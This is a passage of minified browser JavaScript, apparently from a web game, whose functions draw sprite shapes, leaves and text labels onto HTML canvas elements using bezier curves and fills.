                    r.bezierCurveTo(23 * e, 36 * e, 24 * e, 42 * e, 19 * e, 46 * e),
                    r.bezierCurveTo(12 * e, 39 * e, 15 * e, 38 * e, 18 * e, 37 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 34 * e),
                    r.bezierCurveTo(35 * e, 36 * e, 36 * e, 39 * e, 32 * e, 45 * e),
                    r.bezierCurveTo(25 * e, 46 * e, 25 * e, 44 * e, 30 * e, 34 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59 * e, 35 * e),
                    r.bezierCurveTo(58 * e, 27 * e, 57 * e, 27 * e, 52 * e, 31 * e),
                    r.bezierCurveTo(50 * e, 36 * e, 53 * e, 38 * e, 58 * e, 36 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(63 * e, 46 * e),
                    r.bezierCurveTo(64.5 * e, 46.5 * e, 64.5 * e, 46.5 * e, 66 * e, 47 * e),
                    r.bezierCurveTo(70 * e, 50 * e, 70 * e, 53 * e, 61 * e, 55 * e),
                    r.bezierCurveTo(62 * e, 50.5 * e, 62 * e, 50.5 * e, 63 * e, 46 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(41 * e, 42 * e),
                    r.bezierCurveTo(47 * e, 41 * e, 53 * e, 47 * e, 46 * e, 51 * e),
                    r.bezierCurveTo(38 * e, 49 * e, 39 * e, 46 * e, 41 * e, 43 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 57 * e),
                    r.bezierCurveTo(54 * e, 57 * e, 54 * e, 58 * e, 55 * e, 61 * e),
                    r.bezierCurveTo(54 * e, 63 * e, 52 * e, 64 * e, 48 * e, 65 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(20 * e, 52 * e),
                    r.bezierCurveTo(25 * e, 51 * e, 27 * e, 50 * e, 28 * e, 54 * e),
                    r.bezierCurveTo(27 * e, 58 * e, 24 * e, 58 * e, 22 * e, 58 * e),
                    r.bezierCurveTo(21 * e, 55.5 * e, 21 * e, 55.5 * e, 20 * e, 53 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 61 * e),
                    r.bezierCurveTo(37 * e, 61 * e, 39 * e, 63 * e, 39 * e, 68 * e),
                    r.bezierCurveTo(36 * e, 68.5 * e, 36 * e, 68.5 * e, 33 * e, 69 * e),
                    r.bezierCurveTo(30.5 * e, 67.5 * e, 30.5 * e, 67.5 * e, 28 * e, 66 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(88 * e, 45 * e),
                    r.bezierCurveTo(90 * e, 46.5 * e, 90 * e, 46.5 * e, 92 * e, 48 * e),
                    r.bezierCurveTo(92 * e, 50 * e, 92 * e, 50 * e, 92 * e, 52 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(96 * e, 53 * e),
                    r.bezierCurveTo(97.5 * e, 55 * e, 97.5 * e, 55 * e, 99 * e, 57 * e),
                    r.bezierCurveTo(97.5 * e, 59.5 * e, 97.5 * e, 59.5 * e, 96 * e, 62 * e),
                    r.bezierCurveTo(93.5 * e, 60.5 * e, 93.5 * e, 60.5 * e, 91 * e, 59 * e),
                    r.bezierCurveTo(91.5 * e, 57 * e, 91.5 * e, 57 * e, 92 * e, 55 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(92 * e, 71 * e),
                    r.bezierCurveTo(94.5 * e, 70.5 * e, 94.5 * e, 70.5 * e, 97 * e, 70 * e),
                    r.bezierCurveTo(98.5 * e, 72.5 * e, 98.5 * e, 72.5 * e, 100 * e, 75 * e),
                    r.bezierCurveTo(97 * e, 76.5 * e, 97 * e, 76.5 * e, 94 * e, 78 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(95 * e, 82 * e),
                    r.bezierCurveTo(96 * e, 83 * e, 96 * e, 83 * e, 97 * e, 84 * e),
                    r.bezierCurveTo(97 * e, 85.5 * e, 97 * e, 85.5 * e, 97 * e, 87 * e),
                    r.bezierCurveTo(93.5 * e, 87.5 * e, 93.5 * e, 87.5 * e, 90 * e, 88 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86 * e, 72 * e),
                    r.bezierCurveTo(89 * e, 76 * e, 88 * e, 81 * e, 85 * e, 82 * e),
                    r.bezierCurveTo(80 * e, 80 * e, 82 * e, 78 * e, 85 * e, 72 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 86 * e),
                    r.bezierCurveTo(84 * e, 88 * e, 86 * e, 88 * e, 85 * e, 93 * e),
                    r.bezierCurveTo(80 * e, 96 * e, 79 * e, 96 * e, 76 * e, 91 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84 * e, 46 * e),
                    r.bezierCurveTo(93 * e, 51 * e, 91 * e, 62 * e, 80 * e, 78 * e),
                    r.bezierCurveTo(74 * e, 86 * e, 66 * e, 90 * e, 60 * e, 86 * e),
                    r.bezierCurveTo(55 * e, 79 * e, 57 * e, 73 * e, 67 * e, 57 * e),
                    r.bezierCurveTo(71 * e, 51 * e, 79 * e, 44 * e, 84 * e, 46 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(76 * e, 60 * e),
                    r.bezierCurveTo(80 * e, 66 * e, 75 * e, 74 * e, 68 * e, 74 * e),
                    r.bezierCurveTo(60 * e, 64 * e, 68 * e, 59 * e, 76 * e, 59 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 5 * e),
                    n
            }
            function dt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 90 * e
                    , a = 4 * e
                    , s = 5 * e;
                return n.width = 70 * e,
                    n.height = o,
                    r.save(),
                    r.translate(-80 * e, -70 * e + s),
                    r.globalAlpha = .5,
                    r.beginPath(),
                    r.bezierCurveTo(130 * e, 79 * e, 132 * e, 86 * e, 130 * e, 93 * e),
                    r.bezierCurveTo(128 * e, 100 * e, 121 * e, 107 * e, 120 * e, 107 * e),
                    r.bezierCurveTo(120 * e, 107 * e, 115 * e, 98 * e, 115 * e, 92 * e),
                    r.bezierCurveTo(115 * e, 86 * e, 119 * e, 76 * e, 127 * e, 73 * e),
                    r.closePath(),
                    he(r, "#0d1b1c"),
                    r.restore(),
                    r.save(),
                    r.translate(-80 * e, -70 * e + s),
                    r.globalAlpha = .5,
                    r.beginPath(),
                    r.bezierCurveTo(112 * e, 109 * e, 111 * e, 100 * e, 106 * e, 93 * e),
                    r.bezierCurveTo(104 * e, 90 * e, 91 * e, 87 * e, 91 * e, 87 * e),
                    r.bezierCurveTo(91 * e, 88 * e, 91 * e, 96 * e, 94 * e, 102 * e),
                    r.bezierCurveTo(97 * e, 108 * e, 106 * e, 112 * e, 113 * e, 112 * e),
                    r.closePath(),
                    he(r, "#0d1b1c"),
                    r.restore(),
                    r.save(),
                    r.translate(-80 * e, -70 * e + s),
                    r.globalAlpha = .5,
                    r.beginPath(),
                    r.bezierCurveTo(108 * e, 120 * e, 100 * e, 119 * e, 91 * e, 127 * e),
                    r.bezierCurveTo(83 * e, 134 * e, 82 * e, 146 * e, 83 * e, 146 * e),
                    r.bezierCurveTo(84 * e, 146 * e, 98 * e, 142 * e, 103 * e, 138 * e),
                    r.bezierCurveTo(107 * e, 135 * e, 110 * e, 130 * e, 112 * e, 121 * e),
                    r.closePath(),
                    he(r, "#0d1b1c"),
                    r.restore(),
                    r.save(),
                    r.translate(3 * e, -93 * e + s),
                    r.rotate(Math.PI / 5),
                    r.globalAlpha = .5,
                    r.beginPath(),
                    r.bezierCurveTo(130 * e, 79 * e, 132 * e, 86 * e, 130 * e, 93 * e),
                    r.bezierCurveTo(128 * e, 100 * e, 121 * e, 107 * e, 120 * e, 107 * e),
                    r.bezierCurveTo(120 * e, 107 * e, 115 * e, 98 * e, 115 * e, 92 * e),
                    r.bezierCurveTo(115 * e, 86 * e, 119 * e, 76 * e, 127 * e, 73 * e),
                    r.closePath(),
                    he(r, "#0d1b1c"),
                    r.restore(),
                    r.save(),
                    r.translate(-80 * e, -70 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(130 * e, 79 * e, 132 * e, 86 * e, 130 * e, 93 * e),
                    r.bezierCurveTo(128 * e, 100 * e, 121 * e, 107 * e, 120 * e, 107 * e),
                    r.bezierCurveTo(120 * e, 107 * e, 115 * e, 98 * e, 115 * e, 92 * e),
                    r.bezierCurveTo(115 * e, 86 * e, 119 * e, 76 * e, 127 * e, 73 * e),
                    r.closePath(),
                    he(r, i[0], i[1], a),
                    r.restore(),
                    r.save(),
                    r.translate(-80 * e, -70 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(112 * e, 109 * e, 111 * e, 100 * e, 106 * e, 93 * e),
                    r.bezierCurveTo(104 * e, 90 * e, 91 * e, 87 * e, 91 * e, 87 * e),
                    r.bezierCurveTo(91 * e, 88 * e, 91 * e, 96 * e, 94 * e, 102 * e),
                    r.bezierCurveTo(97 * e, 108 * e, 106 * e, 112 * e, 113 * e, 112 * e),
                    r.closePath(),
                    he(r, i[0], i[1], a),
                    r.restore(),
                    r.save(),
                    r.translate(-80 * e, -70 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(108 * e, 120 * e, 100 * e, 119 * e, 91 * e, 127 * e),
                    r.bezierCurveTo(83 * e, 134 * e, 82 * e, 146 * e, 83 * e, 146 * e),
                    r.bezierCurveTo(84 * e, 146 * e, 98 * e, 142 * e, 103 * e, 138 * e),
                    r.bezierCurveTo(107 * e, 135 * e, 110 * e, 130 * e, 112 * e, 121 * e),
                    r.closePath(),
                    he(r, i[0], i[1], a),
                    r.restore(),
                    r.save(),
                    r.translate(3 * e, -93 * e),
                    r.rotate(Math.PI / 5),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(130 * e, 79 * e, 132 * e, 86 * e, 130 * e, 93 * e),
                    r.bezierCurveTo(128 * e, 100 * e, 121 * e, 107 * e, 120 * e, 107 * e),
                    r.bezierCurveTo(120 * e, 107 * e, 115 * e, 98 * e, 115 * e, 92 * e),
                    r.bezierCurveTo(115 * e, 86 * e, 119 * e, 76 * e, 127 * e, 73 * e),
                    r.closePath(),
                    he(r, i[0], i[1], a),
                    r.restore(),
                    n
            }
            function Tt(e, t, i, n, r, o, a, s, _, E, u) {
                void 0 === u && (u = 0);
                var d = document.createElement("canvas")
                    , T = d.getContext("2d")
                    , A = (o = o ? o * e : 0,
                        Math.floor(e * i))
                    , h = (T.font = A + "px Baloo Paaji",
                        T.lineJoin = "round",
                        s *= e,
                        a ? 2 * s : 0)
                    , _ = _ ? Math.min(T.measureText(t).width + 2 * e + h, _) : T.measureText(t).width + 2 * e + h + u * e * 2
                    , A = (A + o + u) * e + h;
                return d.width = _,
                    d.height = A,
                    a && (T.fillStyle = a,
                        Ve(T, 0, 0, _, A, 2 * s),
                        T.fill(),
                        T.translate(s, s)),
                    T.textBaseline = "middle",
                    T.font = i + "px Baloo Paaji",
                    T.lineJoin = "round",
                    r && (T.beginPath(),
                        T.fillStyle = r,
                        T.fillText(t, 0, A / 2 + o - h / 2, _)),
                    T.beginPath(),
                    E && (T.strokeStyle = E,
                        T.lineWidth = u,
                        T.strokeText(t, u, (A - h) / 2, _)),
                    T.fillStyle = n,
                    T.fillText(t, u, (A - h) / 2, _),
                    d
            }
            function At(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 220 * e
                    , a = 230 * e
                    , s = 100 * e
                    , _ = s / 4
                    , e = 20 * e;
                return n.width = o,
                    n.height = a,
                    r.translate(o / 2, a / 2 + e),
                    r.globalAlpha = .5,
                    A(r, 7, s, _),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -e),
                    A(r, 7, s, _),
                    he(r, i[1]),
                    A(r, 6, .65 * s, .65 * _),
                    he(r, i[2]),
                    n
            }
            function ht(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d")
                    , a = 220 * e
                    , s = 220 * e
                    , _ = 100 * e
                    , E = _ / 4;
                return r.width = a,
                    r.height = s,
                    o.translate(a / 2, s / 2),
                    o.globalAlpha = t ? .5 : 1,
                    t || o.translate(0 * e, -8 * e),
                    A(o, 7, _, E),
                    he(o, t ? i[0] : i[1]),
                    o.globalAlpha = 1,
                    0 == n ? (A(o, 6, .65 * _, .65 * E),
                        he(o, i[2])) : 1 == n && (o.translate(20 * e, 20 * e),
                            A(o, 6, .45 * _, .4 * E),
                            he(o, i[2])),
                    r
            }
            function lt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 120 * e
                    , a = 150 * e
                    , s = 60 * e
                    , _ = s / 4
                    , E = 15 * e;
                return n.width = o,
                    n.height = a,
                    r.save(),
                    r.translate(o / 2 + 0 * e, a / 2 + 0 * e + E),
                    r.rotate(Math.PI / 3),
                    r.globalAlpha = .5,
                    A(r, 8, s, _),
                    he(r, i[0]),
                    r.restore(),
                    r.save(),
                    r.translate(o / 2 - 11 * e, a / 2 + 12 * e),
                    r.globalAlpha = 1,
                    r.rotate(Math.PI / 3),
                    r.translate(0, -E),
                    A(r, 8, s, _),
                    he(r, i[1]),
                    r.restore(),
                    r.save(),
                    r.translate(o / 2 - 9 * e, a / 2 - 12 * e),
                    r.rotate(Math.PI / 2.8),
                    A(r, 5, .5 * s, .4 * _),
                    he(r, i[2]),
                    r.restore(),
                    r.save(),
                    r.translate(o / 2 + 19 * e, a / 2 + 5 * e),
                    r.rotate(+Math.PI),
                    A(r, 5, .5 * s, .4 * _),
                    he(r, i[2]),
                    r.restore(),
                    r.save(),
                    r.translate(o / 2 - 8 * e, a / 2 + 20 * e),
                    r.rotate(Math.PI / 2.25),
                    A(r, 5, .5 * s, .4 * _),
                    he(r, i[2]),
                    r.restore(),
                    n
            }
            function It(e, t, i) {
                var n, r = document.createElement("canvas"), o = r.getContext("2d"), a = 180 * e, s = 210 * e, _ = (n = 60 * e) / 4, E = 20 * e;
                return r.width = a,
                    r.height = s,
                    o.save(),
                    o.translate(a / 2 - 0 * e, s / 2 - 35 * e + E),
                    o.rotate(Math.PI / -1.8),
                    o.globalAlpha = .5,
                    o.translate(0 * e, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[0]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 + 10 * e, s / 2 + 15 * e + E),
                    o.rotate(Math.PI / 2),
                    o.globalAlpha = .5,
                    o.translate(0 * e, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[0]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 - 50 * e, s / 2 + 40 * e + E),
                    o.rotate(Math.PI / 3),
                    o.globalAlpha = .5,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[0]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 - 0 * e, s / 2 - 35 * e),
                    o.rotate(Math.PI / -1.8),
                    o.globalAlpha = 1,
                    o.translate(0 * e, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[1]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 + 10 * e, s / 2 + 15 * e),
                    o.rotate(Math.PI / 2),
                    o.globalAlpha = 1,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[1]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 - 50 * e, s / 2 + 40 * e),
                    o.rotate(Math.PI / 3),
                    o.globalAlpha = 1,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[1]),
                    o.restore(),
                    _ = (n = 30 * e) / 4,
                    o.save(),
                    o.translate(a / 2 + 5 * e, s / 2 - 20 * e),
                    o.rotate(Math.PI / -1.8),
                    o.globalAlpha = 1,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[2]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 + 0 * e, s / 2 + 10 * e),
                    o.rotate(Math.PI / 2),
                    o.globalAlpha = 1,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[2]),
                    o.restore(),
                    o.save(),
                    o.translate(a / 2 - 45 * e, s / 2 + 35 * e),
                    o.rotate(Math.PI / 3),
                    o.globalAlpha = 1,
                    o.translate(0, -20 * e),
                    A(o, 5, n, _),
                    he(o, i[2]),
                    o.restore(),
                    ke(o, a / 2 - 7 * e, s / 2 + 7 * e, 5),
                    he(o, i[2]),
                    r
            }
            function ct(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 150 * e
                    , a = 10 * e
                    , s = 4 * e;
                return n.width = 140 * e,
                    n.height = o,
                    r.translate(-50 * e, -38 * e + a),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.bezierCurveTo(160 * e, 65 * e, 160 * e, 85 * e, 152 * e, 95 * e),
                    r.bezierCurveTo(152 * e, 95 * e, 173 * e, 94 * e, 187 * e, 102 * e),
                    r.bezierCurveTo(187 * e, 102 * e, 180 * e, 120 * e, 155 * e, 126 * e),
                    r.bezierCurveTo(154 * e, 126 * e, 166 * e, 138 * e, 169 * e, 148 * e),
                    r.bezierCurveTo(169 * e, 148 * e, 148 * e, 152 * e, 133 * e, 140 * e),
                    r.bezierCurveTo(133 * e, 140 * e, 134 * e, 160 * e, 122 * e, 175 * e),
                    r.bezierCurveTo(122 * e, 175 * e, 107 * e, 162 * e, 107 * e, 144 * e),
                    r.bezierCurveTo(107 * e, 144 * e, 98 * e, 164 * e, 73 * e, 167 * e),
                    r.bezierCurveTo(73 * e, 167 * e, 72 * e, 134 * e, 90 * e, 127 * e),
                    r.bezierCurveTo(90 * e, 127 * e, 70 * e, 134 * e, 55 * e, 123 * e),
                    r.bezierCurveTo(55 * e, 123 * e, 58 * e, 115 * e, 75 * e, 104 * e),
                    r.bezierCurveTo(75 * e, 104 * e, 66 * e, 96 * e, 61 * e, 77 * e),
                    r.bezierCurveTo(61 * e, 77 * e, 83 * e, 74 * e, 102 * e, 89 * e),
                    r.bezierCurveTo(102 * e, 89 * e, 92 * e, 66 * e, 110 * e, 41 * e),
                    r.bezierCurveTo(111 * e, 40 * e, 130 * e, 54 * e, 130 * e, 82 * e),
                    r.bezierCurveTo(130 * e, 82 * e, 143 * e, 67 * e, 159 * e, 65 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, 0 - a),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(160 * e, 65 * e, 160 * e, 85 * e, 152 * e, 95 * e),
                    r.bezierCurveTo(152 * e, 95 * e, 173 * e, 94 * e, 187 * e, 102 * e),
                    r.bezierCurveTo(187 * e, 102 * e, 180 * e, 120 * e, 155 * e, 126 * e),
                    r.bezierCurveTo(154 * e, 126 * e, 166 * e, 138 * e, 169 * e, 148 * e),
                    r.bezierCurveTo(169 * e, 148 * e, 148 * e, 152 * e, 133 * e, 140 * e),
                    r.bezierCurveTo(133 * e, 140 * e, 134 * e, 160 * e, 122 * e, 175 * e),
                    r.bezierCurveTo(122 * e, 175 * e, 107 * e, 162 * e, 107 * e, 144 * e),
                    r.bezierCurveTo(107 * e, 144 * e, 98 * e, 164 * e, 73 * e, 167 * e),
                    r.bezierCurveTo(73 * e, 167 * e, 72 * e, 134 * e, 90 * e, 127 * e),
                    r.bezierCurveTo(90 * e, 127 * e, 70 * e, 134 * e, 55 * e, 123 * e),
                    r.bezierCurveTo(55 * e, 123 * e, 58 * e, 115 * e, 75 * e, 104 * e),
                    r.bezierCurveTo(75 * e, 104 * e, 66 * e, 96 * e, 61 * e, 77 * e),
                    r.bezierCurveTo(61 * e, 77 * e, 83 * e, 74 * e, 102 * e, 89 * e),
                    r.bezierCurveTo(102 * e, 89 * e, 92 * e, 66 * e, 110 * e, 41 * e),
                    r.bezierCurveTo(111 * e, 40 * e, 130 * e, 54 * e, 130 * e, 82 * e),
                    r.bezierCurveTo(130 * e, 82 * e, 143 * e, 67 * e, 159 * e, 65 * e),
                    r.closePath(),
                    he(r, i[1], i[2], s),
                    n
            }
            function Ot(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 18 * e
                    , o = (n.width = 18 * e,
                        n.height = o,
                        9 * e)
                    , a = 9 * e
                    , s = 8 * e;
                return r.save(),
                    r.translate(o, a),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, s),
                    he(r, i[0]),
                    s = 3 * e,
                    r.translate(0, -3 * e),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, s),
                    he(r, i[1]),
                    r.restore(),
                    n
            }
            function gt(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 80 * e,
                    i.height = 100 * e,
                    n.scale(.5, .5),
                    n.translate(10, 15),
                    n.globalAlpha = .5,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(47 * e, 5 * e),
                    n.bezierCurveTo(19 * e, 30 * e, 12 * e, 42 * e, 10 * e, 55 * e),
                    n.bezierCurveTo(11 * e, 75 * e, 27 * e, 76 * e, 36 * e, 72 * e),
                    n.bezierCurveTo(52 * e, 60 * e, 53 * e, 46 * e, 54 * e, 31 * e),
                    n.bezierCurveTo(53 * e, 14 * e, 50 * e, 9 * e, 48 * e, 6 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(17 * e, 70 * e),
                    n.bezierCurveTo(18 * e, 77 * e, 10 * e, 83 * e, 4 * e, 87 * e),
                    he(n, void 0, t[0], 10 * e),
                    n.translate(0, -10),
                    n.globalAlpha = 1,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(47 * e, 5 * e),
                    n.bezierCurveTo(19 * e, 30 * e, 12 * e, 42 * e, 10 * e, 55 * e),
                    n.bezierCurveTo(11 * e, 75 * e, 27 * e, 76 * e, 36 * e, 72 * e),
                    n.bezierCurveTo(52 * e, 60 * e, 53 * e, 46 * e, 54 * e, 31 * e),
                    n.bezierCurveTo(53 * e, 14 * e, 50 * e, 9 * e, 48 * e, 6 * e),
                    n.closePath(),
                    he(n, t[1], t[2], 8 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(17 * e, 70 * e),
                    n.bezierCurveTo(18 * e, 77 * e, 10 * e, 83 * e, 4 * e, 87 * e),
                    he(n, void 0, t[2], 8 * e),
                    n.globalAlpha = .5,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(17 * e, 70 * e),
                    n.bezierCurveTo(33 * e, 52 * e, 39 * e, 33 * e, 48 * e, 7 * e),
                    he(n, void 0, t[2], 8 * e),
                    i
            }
            function gt(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 234 * e,
                    i.height = 183 * e,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(76 * e, 25 * e),
                    n.bezierCurveTo(150 * e, 3 * e, 181 * e, 22 * e, 203 * e, 41 * e),
                    n.bezierCurveTo(225 * e, 63 * e, 225 * e, 105 * e, 198 * e, 133 * e),
                    n.bezierCurveTo(179 * e, 157 * e, 134 * e, 178 * e, 81 * e, 164 * e),
                    n.bezierCurveTo(19 * e, 148 * e, 6 * e, 95 * e, 21 * e, 66 * e),
                    n.bezierCurveTo(34 * e, 39 * e, 52 * e, 33 * e, 75 * e, 25 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 4 * e),
                    i
            }
            function pt(e, t, i, n) {
                var r, o = document.createElement("canvas"), a = o.getContext("2d");
                return 0 == n ? (r = 250 * e,
                    o.width = 270 * e,
                    o.height = r,
                    a.beginPath(),
                    a.moveTo(140 * e, 3 * e),
                    a.translate(-25 * e, -20 * e),
                    a.bezierCurveTo(218 * e, 31 * e, 251 * e, 61 * e, 265 * e, 85 * e),
                    a.bezierCurveTo(278 * e, 108 * e, 295 * e, 160 * e, 285 * e, 195 * e),
                    a.bezierCurveTo(271 * e, 242 * e, 213 * e, 268 * e, 188 * e, 266 * e),
                    a.bezierCurveTo(139 * e, 262 * e, 70 * e, 244 * e, 47 * e, 204 * e),
                    a.bezierCurveTo(20 * e, 158 * e, 35 * e, 78 * e, 59 * e, 56 * e),
                    a.bezierCurveTo(90 * e, 28 * e, 124 * e, 23 * e, 140 * e, 23 * e),
                    a.closePath(),
                    he(a, i[0])) : 1 == n ? (r = 350 * e,
                        o.width = 430 * e,
                        o.height = r,
                        a.beginPath(),
                        a.moveTo(180 * e, 5 * e),
                        a.translate(-30 * e, -60 * e),
                        a.bezierCurveTo(283 * e, 60 * e, 265 * e, 163 * e, 335 * e, 206 * e),
                        a.bezierCurveTo(376 * e, 231 * e, 492 * e, 299 * e, 434 * e, 357 * e),
                        a.bezierCurveTo(371 * e, 421 * e, 289 * e, 394 * e, 255 * e, 386 * e),
                        a.bezierCurveTo(218 * e, 377 * e, 91 * e, 359 * e, 50 * e, 272 * e),
                        a.bezierCurveTo(12 * e, 192 * e, 107 * e, 75 * e, 178 * e, 69 * e),
                        a.closePath(),
                        he(a, i[0])) : 2 == n && (r = 300 * e,
                            o.width = 400 * e,
                            o.height = r,
                            a.beginPath(),
                            a.moveTo(80 * e, 52 * e),
                            a.translate(-40 * e, -30 * e),
                            a.bezierCurveTo(124 * e, 77 * e, 241 * e, 22 * e, 311 * e, 65 * e),
                            a.bezierCurveTo(352 * e, 90 * e, 404 * e, 176 * e, 346 * e, 234 * e),
                            a.bezierCurveTo(283 * e, 298 * e, 179 * e, 299 * e, 145 * e, 291 * e),
                            a.bezierCurveTo(108 * e, 282 * e, 100 * e, 239 * e, 63 * e, 205 * e),
                            a.bezierCurveTo(37 * e, 181 * e, 45 * e, 131 * e, 80 * e, 107 * e),
                            a.closePath(),
                            he(a, i[0])),
                    o
            }
            function Rt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = e * t * 2
                    , a = e * t * 2
                    , s = o / 2
                    , _ = a / 2;
                return n.width = o,
                    n.height = a,
                    r.translate(s, _),
                    ke(r, 0, 0, t * e),
                    he(r, i),
                    n
            }
            function Ct(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 373 * e,
                    n.height = 314 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(184.048583984375 * e, 69.1805419921875 * e),
                    Ve(r, -40 * e, -28.5 * e, 80 * e, 57 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(185.048583984375 * e, 61.6805419921875 * e),
                    r.bezierCurveTo(145.048583984375 * e, 59.6805419921875 * e, 138.048583984375 * e, 41.6805419921875 * e, 148.048583984375 * e, 33.6805419921875 * e),
                    r.bezierCurveTo(169.048583984375 * e, 17.6805419921875 * e, 194.048583984375 * e, 20.6805419921875 * e, 210.048583984375 * e, 27.6805419921875 * e),
                    r.bezierCurveTo(234.048583984375 * e, 40.6805419921875 * e, 225.048583984375 * e, 57.6805419921875 * e, 186.048583984375 * e, 61.6805419921875 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(224.048583984375 * e, 56.6805419921875 * e),
                    r.bezierCurveTo(326.048583984375 * e, 69.6805419921875 * e, 363.048583984375 * e, 148.6805419921875 * e, 349.048583984375 * e, 206.6805419921875 * e),
                    r.bezierCurveTo(329.048583984375 * e, 278.6805419921875 * e, 252.048583984375 * e, 283.6805419921875 * e, 206.048583984375 * e, 275.6805419921875 * e),
                    r.bezierCurveTo(206.548583984375 * e, 266.6805419921875 * e, 206.548583984375 * e, 266.6805419921875 * e, 207.048583984375 * e, 257.6805419921875 * e),
                    r.bezierCurveTo(276.048583984375 * e, 268.6805419921875 * e, 308.048583984375 * e, 239.6805419921875 * e, 323.048583984375 * e, 208.6805419921875 * e),
